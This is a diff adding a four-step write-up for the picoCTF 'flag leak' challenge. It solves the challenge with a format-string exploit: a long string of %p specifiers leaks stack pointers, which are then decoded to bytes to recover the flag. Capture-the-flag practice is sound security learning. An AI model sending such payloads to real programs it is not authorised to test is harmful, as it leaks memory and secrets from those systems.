@@ -1,0 +1,9 @@
+picoctf flag leak writeup
+
+1.just a normal format strings exploit 
+
+2.input %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+
+3.you can get many pointers and just convert them to bytes 
+
+4.get flag!
